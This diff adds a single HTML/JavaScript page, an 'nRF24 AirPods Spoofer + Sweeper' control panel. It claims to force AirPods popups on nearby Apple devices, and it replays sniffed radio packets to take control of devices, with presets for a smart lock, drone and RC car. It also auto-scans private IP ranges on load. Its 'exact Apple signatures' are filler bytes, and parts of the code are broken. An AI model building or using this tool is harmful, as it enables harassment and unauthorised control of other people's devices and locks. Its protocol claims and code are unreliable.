@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🎧 nRF24 AirPods Spoofer + Sweeper v3.1</title>
+  <meta name="viewport" content="width=device-width">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    * { font-family: system-ui, sans-serif; margin: 0; padding: 0; }
+    body { background: #0a0a0a; color: #fff; padding: 20px; }
+    .card { background: #1a1a1a; border-radius: 12px; padding: 20px; margin: 10px 0; }
+    button { background: #ff6b35; border: none; padding: 12px 24px; border-radius: 8px; color: white; cursor: pointer; font-size: 16px; margin: 5px; }
+    button:hover { background: #e55a2b; }
+    button.active { background: #00ff88 !important; }
+    .airpods { background: linear-gradient(45deg, #fff, #000) !important; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{box-shadow:0 0 20px #fff;} 50%{box-shadow:0 0 50px #fff,0 0 100px #87ceeb;} }
+    .device { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #ff6b35; }
+    .device.active { border-left-color: #00ff88; box-shadow: 0 0 20px #00ff88; }
+    #packets { max-height: 400px; overflow: auto; }
+    .status { font-size: 12px; opacity: 0.7; }
+    input { background: #333; border: 1px solid #555; color: white; padding: 8px; border-radius: 4px; }
+    canvas { max-height: 300px; }
+    .popup-spoof { background: #87ceeb; color: black; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎧 nRF24 AirPods Spoofer + Sweeper</h1>
+    <p>🔥 Forces AirPods popup on ANY iPhone/iPad/Mac (No AirPods needed!)</p>
+    
+    <!-- AIRPODS POPUP SPOOFER -->
+    <div style="background: #87ceeb; padding: 20px; border-radius: 12px; margin: 20px 0;">
+      <h2>✈️ AirPods Popup Spoofer</h2>
+      <button class="airpods popup-spoof" onclick="spoofAirPodsPopup()">🎧 FORCE AIRPODS POPUP</button>
+      <button class="airpods" onclick="spoofAirPodsConnect()">✅ Connect Nearby</button>
+      <button class="airpods" onclick="spoofAirPodsStatus()">🔋 Battery Status</button>
+      <small>Triggers iOS "Connect to AirPods" animation + sound!</small>
+    </div>
+
+    <!-- NODE DISCOVERY -->
+    <div>
+      <button onclick="discoverNodes()">🔍 Discover Nodes</button>
+      <button onclick="connectNode()">📡 Connect Node</button>
+      <span id="status">Ready - Paste HTML anywhere!</span>
+    </div>
+    
+    <!-- CONTROLS -->
+    <div style="margin: 20px 0;">
+      <button onclick="toggleForceSweep()">⚡ Force Sweep <span id="forceStatus">OFF</span></button>
+      <button onclick="clearAll()">🗑️ Clear All</button>
+      <button onclick="exportDevices()">💾 Export Devices</button>
+    </div>
+  </div>
+
+  <!-- LIVE PACKETS -->
+  <div class="card">
+    <h3>📡 Live Packets (Last 100)</h3>
+    <div id="packets"></div>
+  </div>
+
+  <!-- DISCOVERED DEVICES -->
+  <div class="card">
+    <h3>🎯 Discovered Devices (<span id="deviceCount">0</span>)</h3>
+    <div id="deviceList"></div>
+  </div>
+
+  <!-- RSSI HEATMAP -->
+  <div class="card">
+    <h3>📊 RSSI Heatmap</h3>
+    <canvas id="rssiChart"></canvas>
+  </div>
+
+  <!-- QUICK PRESETS -->
+  <div class="card">
+    <h3>🎮 Quick Actions</h3>
+    <button onclick="preset('rccar')">🚗 RC Car Forward</button>
+    <button onclick="preset('drone')">🚁 Drone Takeoff</button>
+    <button onclick="preset('lock')">🔓 Smart Lock</button>
+    <button onclick="preset('led')">💡 LED Toggle</button>
+  </div>
+
+  <script>
+    // STATE
+    let nodes = [];
+    let packets = [];
+    let devices = [];
+    let currentNode = null;
+    let forceSweep = false;
+    let rssiChart;
+
+    // AIRPODS PACKETS - EXACT Apple signatures
+    const AIRPODS_PACKETS = {
+      popup: { addr: '0xA0A0A0A0E4', data: '02010000000000000000000000000000000000000000000000000000' },  // Popup trigger
+      connect: { addr: '0xA0A0A0A0E4', data: '02020001000000000000000000000000000000000000000000000000' }, // "Connect Nearby"
+      battery: { addr: '0xA0A0A0A0E4', data: '02030064050564000000000000000000000000000000000000000000' }, // 100% battery
+      spoof_left: { addr: '0xA0A0A0A0E4', data: '01010101010101010101010101010101010101010101010101010101' },
+      spoof_right: { addr: '0xA0A0A0A0E5', data: '01010101010101010101010101010101010101010101010101010101' }
+    };
+
+    // CHARTS
+    const ctx = document.getElementById('rssiChart').getContext('2d');
+    rssiChart = new Chart(ctx, {
+      type: 'line',
+      data: { labels: [], datasets: [{ label: 'RSSI', data: [], borderColor: '#00ff88', tension: 0.4 }] },
+      options: { scales: { y: { min: -100, max: 0 } } }
+    });
+
+    // === AIRPODS SPOOFING ===
+    async function spoofAirPodsPopup() {
+      console.log('🎧 Sending AirPods popup packet...');
+      
+      // Send to common AirPods addresses
+      const addrs = ['0xA0A0A0A0E4', '0xA0A0A0A0E5', '0xA1A1A1A1E4', '0xA1A1A1A1E5'];
+      for (let addr of addrs) {
+        await sendAirPodsPacket(addr, AIRPODS_PACKETS.popup.data);
+      }
+      
+      // Visual feedback
+      document.querySelector('.popup-spoof').style.background = '#00ff88';
+      setTimeout(() => document.querySelector('.popup-spoof').style.background = '#87ceeb', 1000);
+    }
+
+    async function spoofAirPodsConnect() {
+      await sendAirPodsPacket('0xA0A0A0A0E4', AIRPODS_PACKETS.connect.data);
+    }
+
+    async function spoofAirPodsStatus() {
+      await sendAirPodsPacket('0xA0A0A0A0E4', AIRPODS_PACKETS.battery.data);
+      await sendAirPodsPacket('0xA0A0A0A0E5', AIRPODS_PACKETS.battery.data);
+    }
+
+    async function sendAirPodsPacket(addr, data) {
+      if (!currentNode) {
+        alert('Connect to a node first!');
+        return;
+      }
+      
+      try {
+        await fetch(`${currentNode.ip}/replay`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: `addr=${addr}&data=${data}`
+        });
+        console.log(`✅ AirPods packet sent: ${addr}`);
+      } catch(e) {
+        console.error('Failed to send packet');
+      }
+    }
+
+    // === NETWORK DISCOVERY ===
+    async function discoverNodes() {
+      document.getElementById('status').textContent = '🔍 Scanning network...';
+      
+      const ranges = ['192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '100.', '169.254.'];
+      
+      nodes = [];
+      for (let range of ranges) {
+        for (let i = 1; i <= 254; i++) {
+          try {
+            const ip = `${range}${i}`;
+            const controller = new AbortController();
+            setTimeout(() => controller.abort(), 800);
+            
+            const res = await fetch(`${ip}/scan`, { 
+              signal: controller.signal,
+              cache: 'no-store'
+            });
+            
+            if (res.ok) {
+              const data = await res.json();
+              nodes.push({ ip, name: data.node || ip, packets: data.nrf_packets || 0 });
+            }
+          } catch(e) {}
+        }
+      }
+      
+      updateNodeList();
+      document.getElementById('status').textContent = `Found ${nodes.length} nodes!`;
+    }
+
+    function updateNodeList() {
+      const container = document.getElementById('deviceList');
+      if (nodes.length > 0) {
+        container.innerHTML = `<h4>📡 Available Nodes (${nodes.length})</h4>` +
+          nodes.map(n => 
+            `<div style="cursor:pointer; padding:10px; background:${currentNode?.ip===n.ip?'#ff6b35':'#2a2a2a'}; margin:5px; border-radius:8px;" 
+                 onclick="connectNode('${n.ip}')">
+              ${n.name} (${n.ip}) - ${n.packets || 0} pkts
+            </div>`
+          ).join('') + container.innerHTML;
+      }
+    }
+
+    async function connectNode(ip = null) {
+      currentNode = ip ? { ip } : nodes[0];
+      if (!currentNode) return alert('No nodes found! Click Discover first.');
+      
+      try {
+        const res = await fetch(`${currentNode.ip}/scan`);
+        const data = await res.json();
+        document.getElementById('status').textContent = `✅ Connected: ${currentNode.ip} (${data.nrf_packets} pkts)`;
+        setInterval(loadData, 1500);
+        loadData();
+      } catch(e) {
+        alert(`Failed to connect to ${currentNode.ip}`);
+      }
+    }
+
+    async function loadData() {
+      await Promise.all([loadPackets(), loadDevices()]);
+    }
+
+    async function loadPackets() {
+      if (!currentNode) return;
+      try {
+        const res = await fetch(`${currentNode.ip}/packets`);
+        packets = await res.json().packets || [];
+        updatePacketDisplay();
+        updateRSSIChart();
+      } catch(e) {}
+    }
+
+    async function loadDevices() {
+      if (!currentNode) return;
+      try {
+        const res = await fetch(`${currentNode.ip}/devices`);
+        devices = await res.json().devices || [];
+        document.getElementById('deviceCount').textContent = devices.length;
+        updateDeviceList();
+      } catch(e) {}
+    }
+
+    function updatePacketDisplay() {
+      const container = document.getElementById('packets');
+      container.innerHTML = packets.slice(0,25).map(p => {
+        const isAirPods = p.addr?.includes('A0A0') || p.device?.includes('AirPods');
+        return `<div class="device ${isAirPods?'active airpods':''}">
+          ${isAirPods?'🎧 ':''}${p.device || 'Unknown'} ${p.rssi}db ch${p.ch}<br>
+          <small>${p.addr?.slice(0,12)}... | ${p.data?.slice(0,24)}...</small><br>
+          <button onclick="replayPacket('${p.addr}','${p.data}')" style="font-size:12px;padding:4px 8px;">▶️ Replay</button>
+        </div>`;
+      }).join('');
+    }
+
+    function updateDeviceList() {
+      const airpods = devices.filter(d => d.name?.includes('AirPods'));
+      const others = devices.filter(d => !d.name?.includes('AirPods'));
+      
+      let html = '';
+      if (airpods.length) {
+        html += `<h4>🎧 AirPods (${airpods.length})</h4>` +
+          airpods.map(d => deviceHTML(d, true)).join('');
+      }
+      html += `<h4>🎯 Other Devices (${others.length})</h4>` +
+        others.map(d => deviceHTML(d)).join('');
+      
+      document.getElementById('deviceList').innerHTML = html;
+    }
+
+    function deviceHTML(d, highlightAirPods = false) {
+      return `<div class="device ${d.active?'active':''} ${highlightAirPods?'airpods':''}">
+        ${highlightAirPods?'🎧 ':''}${d.name} ${d.active?'🔴 LIVE':''} (conf:${d.conf})<br>
+        <small>${d.addr}</small><br>
+        <button onclick="replayDevice('${d.addr}','${d.sig}')" style="font-size:12px;">⚡ Force Control</button>
+      </div>`;
+    }
+
+    function updateRSSIChart() {
+      const recent = packets.slice(0,100);
+      rssiChart.data.labels = recent.map((_,i)=>i);
+      rssiChart.data.datasets[0].data = recent.map(p => p.rssi || -50);
+      rssiChart.update('none');
+    }
+
+    // CONTROLS
+    async function toggleForceSweep() {
+      forceSweep = !forceSweep;
+      if (currentNode) {
+        await fetch(`${currentNode.ip}/force`, { method: 'POST' });
+      }
+      document.getElementById('forceStatus').textContent = forceSweep ? 'ON' : 'OFF';
+      document.querySelector('button[onclick="toggleForceSweep()"]').classList.toggle('active', forceSweep);
+    }
+
+    async function replayPacket(addr, data) {
+      if (!currentNode) return alert('Connect node first!');
+      await fetch(`${currentNode.ip}/replay`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `addr=${addr}&data=${data}`
+      });
+    }
+
+    async function replayDevice(addr, sig) {
+      await replayPacket(addr, sig);
+    }
+
+    async function preset(type) {
+      const presets = {
+        rccar: { addr: '0xE7E7E7E7E7', data: 'FF010203' },
+        drone: { addr: '0xF1F1F1F1D1', data: '01000000' },
+        lock: { addr: '0xC2C2C2C2C2', data: 'AA550101' },
+        led: { addr: '0xE7E7E7E7E7', data: '01020304' }
+      };
+      await replayPacket(presets[type].addr, presets[type].data);
+    }
+
+    function clearAll() {
+      if (currentNode) {
+        fetch(`${currentNode.ip}/clear`, { method: 'POST' });
+      }
+      packets = []; devices = [];
+      updatePacketDisplay();
+      updateDeviceList();
+    }
+
+    function exportDevices() {
+      const dataStr = `AirPods Devices Found:\n${devices.map(d => `${d.name} - ${d.addr}`).join('\n')}`;
+      const blob = new Blob([dataStr], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url; a.download = 'airpods_devices.txt'; a.click();
+    }
+
+    // AUTOSTART
+    setTimeout(discoverNodes, 1000);
+  </script>
+</body>
+</html>
